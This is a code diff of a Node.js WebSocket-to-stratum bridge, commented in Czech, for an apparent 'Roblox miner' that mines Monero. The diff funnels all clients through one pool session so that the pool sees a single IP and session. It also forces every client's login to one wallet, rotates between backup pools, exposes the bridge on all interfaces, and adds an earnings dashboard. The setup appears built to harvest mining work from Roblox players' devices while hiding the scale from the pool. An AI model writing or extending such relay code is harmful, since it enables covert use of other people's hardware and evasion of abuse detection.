@@ -1,5 +1,6 @@
 // stratum <-> websocket bridge pro Roblox miner (bez zavislosti, jen Node builtiny)
-// usage: node bridge/stratum-bridge.js [--port 8790] [--bind 127.0.0.1]
+// Vsechny klienty jedou pres JEDNO pool spojeni (pool tak vidi 1 IP/1 session).
+// usage: node bridge/stratum-bridge.js [--port 8790] [--bind 0.0.0.0]
 //        [--pool gulf.moneroocean.stream:10128] [--wallet 4...] [--stats-api URL]
 // Na `/` bezi dashboard, `/api/stats` vraci JSON, WS jde na libovolnou cestu.
 const crypto = require("node:crypto");
@@ -12,10 +13,21 @@ const getArg = (name, def) => {
 };
 const LISTEN = Number(getArg("--port", "8790"));
 const BIND = getArg("--bind", "0.0.0.0");
-const POOL = getArg("--pool", "gulf.moneroocean.stream:10128");
-const POOL_HOST = POOL.slice(0, POOL.lastIndexOf(":"));
-const POOL_PORT = Number(POOL.slice(POOL.lastIndexOf(":") + 1));
-// kdyz je zadana, prepise se login kazdeho klienta -> vsechno tezi na jednu adresu
+// --pool lze zadat vicekrat: prvni je primarni, dalsi zalozni (rotace po chybach)
+const POOLS = args.reduce((acc, a, i) => (a === "--pool" && args[i + 1] ? acc.concat(args[i + 1]) : acc), []);
+if (!POOLS.length) POOLS.push("gulf.moneroocean.stream:10128");
+let poolIdx = 0;
+let POOL = POOLS[0];
+let POOL_HOST = POOL.slice(0, POOL.lastIndexOf(":"));
+let POOL_PORT = Number(POOL.slice(POOL.lastIndexOf(":") + 1));
+function nextPool() {
+	poolIdx = (poolIdx + 1) % POOLS.length;
+	POOL = POOLS[poolIdx];
+	POOL_HOST = POOL.slice(0, POOL.lastIndexOf(":"));
+	POOL_PORT = Number(POOL.slice(POOL.lastIndexOf(":") + 1));
+	log("prepinam pool ->", POOL);
+}
+// kdyz je zadana, prepise se login a vsechno tezi na jednu adresu
 const FORCED_WALLET = getArg("--wallet", process.env.WALLET || "");
 const STATS_API = getArg("--stats-api", process.env.STATS_API || "https://api.moneroocean.stream");
 const STARTED = Date.now();
@@ -24,16 +36,17 @@ const log = (...a) => console.log(new Date().toISOString().slice(11, 19), ...a);
 
 // ── evidence klientu a souhrnu ────────────────────────────────────────────────
 let nextId = 1;
-const clients = new Map(); // id -> zaznam o spojeni
+const clients = new Map(); // id -> zaznam
 const totals = { sessions: 0, shares: 0, accepted: 0, rejected: 0, peak: 0 };
-const pendingSubmit = new Map(); // rpc id -> client id
+const pendingSubmit = new Map(); // pool rpc id -> { clientId, rpcId }
+let pendingLogin = []; // cekajici klienti na odpoved poolu
 
 function newClient(ip) {
 	const c = {
 		id: nextId++,
 		ip,
 		agent: "",
-		wallet: "",
+		wallet: FORCED_WALLET,
 		origWallet: "",
 		since: Date.now(),
 		lastSeen: Date.now(),
@@ -44,20 +57,147 @@ function newClient(ip) {
 		lastShareAt: null,
 		conn: true,
 		closedAt: null,
+		send: null,
 	};
 	clients.set(c.id, c);
 	totals.sessions += 1;
-	totals.peak = Math.max(totals.peak, [...clients.values()].filter((x) => x.conn).length);
+	totals.peak = Math.max(totals.peak, onlineCount());
 	return c;
 }
+const onlineCount = () => [...clients.values()].filter((c) => c.conn).length;
 
-// odpojene klienty drz jeste 5 minut, pak zapomen
 setInterval(() => {
 	const now = Date.now();
 	for (const c of clients.values()) if (!c.conn && now - c.closedAt > 300_000) clients.delete(c.id);
 }, 60_000).unref();
 
-// statistiky z poolu pro penizenku (MoneroOcean API)
+// ── pool session (jedno spojeni pro vsechny) ─────────────────────────────────
+const pool = { sock: null, up: false, sessionId: null, lastJob: null, buf: "", delay: 3000, nextAt: 0 };
+let nextPoolId = 1000;
+
+function poolSend(obj) {
+	if (!pool.sock || !pool.sock.writable) return false;
+	pool.sock.write(JSON.stringify(obj) + "\n");
+	return true;
+}
+
+function broadcastJob(job) {
+	pool.lastJob = job;
+	for (const c of clients.values()) if (c.conn) c.send?.({ method: "job", params: job });
+}
+
+function poolConnect(force) {
+	// drz se backoffu, aby klienti pool nezahlcovali reconnecty
+	if (pool.sock || !FORCED_WALLET || (!force && Date.now() < pool.nextAt)) return;
+	pool.sock = net.connect(POOL_PORT, POOL_HOST);
+	pool.sock.setNoDelay(true);
+	pool.buf = "";
+
+	pool.sock.on("connect", () => {
+		pool.up = true;
+		log("pool up ->", POOL);
+		const id = nextPoolId++;
+		const rpc = { id, jsonrpc: "2.0", method: "login", params: { login: FORCED_WALLET, pass: "x", agent: "rx-luau-bridge" } };
+		pool.loginId = id;
+		poolSend(rpc);
+	});
+
+	pool.sock.on("data", (d) => {
+		pool.buf += d.toString("utf8");
+		let idx;
+		while ((idx = pool.buf.indexOf("\n")) >= 0) {
+			const line = pool.buf.slice(0, idx);
+			pool.buf = pool.buf.slice(idx + 1);
+			if (line.trim()) onPoolLine(line);
+		}
+	});
+
+	pool.sock.on("error", (e) => log("pool error", e.message));
+
+	pool.sock.on("close", () => {
+		log("pool closed");
+		pool.sock = null;
+		pool.up = false;
+		pool.sessionId = null;
+		pool.loginId = null;
+		pendingSubmit.clear();
+		pool.fails = (pool.fails || 0) + 1;
+		if (POOLS.length > 1 && pool.fails % 3 === 0) nextPool(); // 3 selhani = zkus jiny pool
+		pool.delay = Math.min(30_000, pool.delay * 2);
+		pool.nextAt = Date.now() + pool.delay;
+		setTimeout(() => poolConnect(true), pool.delay).unref();
+	});
+}
+
+function onPoolLine(line) {
+	let m = null;
+	try {
+		m = JSON.parse(line);
+	} catch {}
+
+	if (m?.params?.height) for (const c of clients.values()) c.height = m.params.height;
+
+	// odpoved na login
+	if (m && pool.loginId != null && String(m.id) === String(pool.loginId)) {
+		pool.loginId = null;
+		if (m.error) {
+			log("pool login odmítnut:", m.error.message);
+			answerLogin({ id: m.id, error: m.error });
+		} else {
+			pool.sessionId = m.result?.id ?? null;
+			pool.delay = 3000;
+			pool.fails = 0;
+			const job = m.result?.job ?? null;
+			log("pool prihlasen, session", pool.sessionId);
+			if (job) broadcastJob(job);
+			answerLogin(m);
+		}
+		return;
+	}
+
+	// novy job od poolu
+	if (m?.method === "job" && m.params) {
+		broadcastJob(m.params);
+		return;
+	}
+
+	// odpoved na submit -> vrat ji klientovi, ktery ho poslal
+	const who = m && m.id != null ? pendingSubmit.get(String(m.id)) : null;
+	if (who) {
+		pendingSubmit.delete(String(m.id));
+		const c = clients.get(who.clientId);
+		if (c) {
+			if (m.error) {
+				c.rejected += 1;
+				totals.rejected += 1;
+			} else {
+				c.accepted += 1;
+				totals.accepted += 1;
+			}
+			c.send?.({ jsonrpc: "2.0", id: who.rpcId, error: m.error ?? null, result: m.result ?? null });
+		}
+		return;
+	}
+
+	log("pool:", line.slice(0, 160));
+}
+
+function answerLogin(resp) {
+	const waiting = pendingLogin;
+	pendingLogin = [];
+	for (const w of waiting) {
+		const c = clients.get(w.clientId);
+		if (!c?.conn) continue;
+		c.send?.({
+			jsonrpc: "2.0",
+			id: w.rpcId,
+			error: resp.error ?? null,
+			result: resp.error ? null : { id: resp.result?.id ?? pool.sessionId, job: resp.result?.job ?? pool.lastJob },
+		});
+	}
+}
+
+// ── statistiky z poolu ───────────────────────────────────────────────────────
 let poolStats = { fetchedAt: 0, error: null, data: null };
 async function refreshPoolStats() {
 	if (!FORCED_WALLET) return;
@@ -66,7 +206,7 @@ async function refreshPoolStats() {
 		if (!r.ok) throw new Error(`HTTP ${r.status}`);
 		const d = await r.json();
 		const num = (v) => (typeof v === "number" ? v : null);
-		const pico = (v) => (typeof v === "number" ? v / 1e12 : null); // amtDue/amtPaid jsou v piconero
+		const pico = (v) => (typeof v === "number" ? v / 1e12 : null); // amtDue/amtPaid je v piconero
 		poolStats = {
 			fetchedAt: Date.now(),
 			error: null,
@@ -76,7 +216,6 @@ async function refreshPoolStats() {
 				paid: pico(d.amtPaid),
 				validShares: num(d.validShares),
 				invalidShares: num(d.invalidShares),
-				lastShare: d.lastHash === false ? null : (d.lastHash ?? null),
 			},
 		};
 	} catch (e) {
@@ -91,14 +230,13 @@ async function refreshPrice() {
 		const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd", {
 			signal: AbortSignal.timeout(8000),
 		});
-		const d = await r.json();
-		xmrUsd = d?.monero?.usd ?? null;
+		xmrUsd = (await r.json())?.monero?.usd ?? null;
 	} catch {}
 }
 setInterval(refreshPrice, 300_000).unref();
 refreshPrice();
 
-// ── minimalni websocket ────────────────────────────────────────────────────────
+// ── minimalni websocket ──────────────────────────────────────────────────────
 const WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
 
 function encodeFrame(text) {
@@ -120,7 +258,6 @@ function encodeFrame(text) {
 	return Buffer.concat([head, data]);
 }
 
-// vraci funkci pro kazdy chunk; pri close/ping vola prislusne callbacky
 function createParser(onMessage, onClose) {
 	let buf = Buffer.alloc(0);
 	let closed = false;
@@ -152,13 +289,13 @@ function createParser(onMessage, onClose) {
 				onClose();
 				return;
 			}
-			if (opcode === 0x9) continue; // ping
+			if (opcode === 0x9) continue;
 			if (fin) onMessage(payload.toString("utf8"));
 		}
 	};
 }
 
-// ── HTTP (dashboard) ──────────────────────────────────────────────────────────
+// ── HTTP (dashboard) ─────────────────────────────────────────────────────────
 function sendHttp(socket, status, type, body) {
 	socket.end(
 		`HTTP/1.1 ${status}\r\nContent-Type: ${type}\r\nContent-Length: ${Buffer.byteLength(body)}\r\n` +
@@ -174,6 +311,7 @@ function snapshot() {
 		uptimeS: Math.floor((now - STARTED) / 1000),
 		wallet: FORCED_WALLET,
 		pool: POOL,
+		poolUp: pool.up,
 		price: xmrUsd,
 		poolStats,
 		totals,
@@ -238,11 +376,10 @@ const xmr = (v) => (v == null ? "–" : Number(v).toFixed(6));
 async function tick() {
   try {
     const d = await (await fetch("api/stats")).json();
-    document.getElementById("pool").textContent = d.pool;
+    document.getElementById("pool").textContent = d.pool + (d.poolUp ? " (up)" : " (down)");
     document.getElementById("wallet").textContent = d.wallet || "(bez vynucené adresy)";
     document.getElementById("up").textContent = "běží " + Math.floor(d.uptimeS / 60) + " min";
-    const online = d.clients.filter((c) => c.online).length;
-    document.getElementById("mConn").textContent = online;
+    document.getElementById("mConn").textContent = d.clients.filter((c) => c.online).length;
     document.getElementById("mShares").textContent = fmt(d.totals.shares);
     document.getElementById("mAcc").textContent = fmt(d.totals.accepted) + " / " + fmt(d.totals.rejected);
     const p = d.poolStats && d.poolStats.data;
@@ -260,47 +397,64 @@ tick(); setInterval(tick, 3000);
 </script></body></html>`;
 }
 
-// ── spojeni ──────────────────────────────────────────────────────────────────
+// ── spojeni klienta ──────────────────────────────────────────────────────────
 function onConnection(socket) {
 	socket.on("error", (e) => log("ws error", e.message));
 	let head = Buffer.alloc(0);
 	let open = false;
 	let client = null;
 
-	const send = (text) => {
+	const send = (obj) => {
 		try {
-			socket.write(encodeFrame(text));
+			socket.write(encodeFrame(typeof obj === "string" ? obj : JSON.stringify(obj)));
 		} catch {}
 	};
 
-	let tcp = null;
 	const parse = createParser(
 		(text) => {
 			if (client) client.lastSeen = Date.now();
-			log("ws->pool:", text.slice(0, 200));
-			let parsed = null;
+			let m = null;
 			try {
-				parsed = JSON.parse(text);
+				m = JSON.parse(text);
 			} catch {}
-			if (parsed && client) {
-				if (parsed.method === "login" && parsed.params) {
-					client.origWallet = String(parsed.params.login || "");
-					client.agent = String(parsed.params.agent || "").slice(0, 60);
-					if (FORCED_WALLET) parsed.params.login = FORCED_WALLET;
-					text = JSON.stringify(parsed);
-				} else if (parsed.method === "submit" && parsed.id != null) {
-					pendingSubmit.set(String(parsed.id), client.id);
-					client.shares += 1;
-					client.lastShareAt = Date.now();
-					totals.shares += 1;
+			if (!client || !m) return;
+
+			if (m.method === "login" && m.params) {
+				client.origWallet = String(m.params.login || "");
+				client.agent = String(m.params.agent || "").slice(0, 60);
+				client.wallet = FORCED_WALLET || client.origWallet;
+				log(`login #${client.id} ${client.agent || "?"} z ${client.ip}`);
+				poolConnect(); // pri prvnim klientovi nahodi pool session
+				if (pool.sessionId && pool.lastJob) {
+					return send({
+						jsonrpc: "2.0",
+						id: m.id,
+						error: null,
+						result: { id: pool.sessionId, job: pool.lastJob },
+					});
 				}
+				pendingLogin.push({ clientId: client.id, rpcId: m.id });
+				return;
 			}
-			if (tcp && tcp.writable) tcp.write(text.replace(/\n*$/, "\n"));
+
+			if (m.method === "keepalived") {
+				return send({ jsonrpc: "2.0", id: m.id, error: null, result: { status: "KEEPALIVED" } });
+			}
+
+			if (m.method === "submit") {
+				client.shares += 1;
+				client.lastShareAt = Date.now();
+				totals.shares += 1;
+				const pid = nextPoolId++;
+				pendingSubmit.set(String(pid), { clientId: client.id, rpcId: m.id });
+				if (!poolSend({ id: pid, jsonrpc: "2.0", method: "submit", params: m.params })) {
+					pendingSubmit.delete(String(pid));
+					send({ jsonrpc: "2.0", id: m.id, error: { code: -1, message: "pool offline" }, result: null });
+				}
+				return;
+			}
 		},
-		() => {
-			if (tcp) tcp.end();
-			socket.destroy();
-		},
+		() => socket.destroy(),
 	);
 
 	socket.on("data", (chunk) => {
@@ -323,7 +477,7 @@ function onConnection(socket) {
 			.replace("::ffff:", "")
 			.trim();
 		client = newClient(ip);
-		client.wallet = FORCED_WALLET;
+		client.send = send;
 		log(`ws client connected #${client.id} z ${ip}`);
 
 		const accept = crypto.createHash("sha1").update((key || "") + WS_GUID).digest("base64");
@@ -334,52 +488,6 @@ function onConnection(socket) {
 				`Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
 		);
 		open = true;
-
-		tcp = net.connect(POOL_PORT, POOL_HOST);
-		tcp.setNoDelay(true);
-		let tcpBuf = "";
-		tcp.on("connect", () => log("tcp up ->", POOL));
-		tcp.on("data", (d) => {
-			tcpBuf += d.toString("utf8");
-			let idx;
-			while ((idx = tcpBuf.indexOf("\n")) >= 0) {
-				const line = tcpBuf.slice(0, idx);
-				tcpBuf = tcpBuf.slice(idx + 1);
-				if (!line.trim()) continue;
-				log("pool:", line.slice(0, 200));
-				try {
-					const m = JSON.parse(line);
-					const job = m.params || m.result?.job;
-					if (job?.height && client) client.height = job.height;
-					const who = m.id != null ? pendingSubmit.get(String(m.id)) : null;
-					if (who != null) {
-						pendingSubmit.delete(String(m.id));
-						const c = clients.get(who);
-						if (c) {
-							if (m.error) {
-								c.rejected += 1;
-								totals.rejected += 1;
-							} else {
-								c.accepted += 1;
-								totals.accepted += 1;
-							}
-						}
-					}
-				} catch {}
-				send(line);
-			}
-		});
-		tcp.on("error", (e) => {
-			log("tcp error", e.message);
-			send(JSON.stringify({ __bridge: "tcp_error", message: e.message }));
-		});
-		tcp.on("close", () => {
-			log("tcp closed");
-			try {
-				socket.end();
-			} catch {}
-		});
-
 		if (rest.length) parse(rest);
 	});
 
@@ -387,9 +495,9 @@ function onConnection(socket) {
 		if (client) {
 			client.conn = false;
 			client.closedAt = Date.now();
+			pendingLogin = pendingLogin.filter((w) => w.clientId !== client.id);
 			log(`ws client gone #${client.id}`);
 		}
-		if (tcp) tcp.end();
 	});
 }
 
@@ -403,4 +511,5 @@ server.listen(LISTEN, BIND, () => {
 	log(`bridge listening on ws://${BIND}:${LISTEN} ->`, POOL);
 	log(FORCED_WALLET ? `penizenka vynucena: ${FORCED_WALLET}` : "penizenka: bere se z klienta");
 	refreshPoolStats();
+	poolConnect(true);
 });
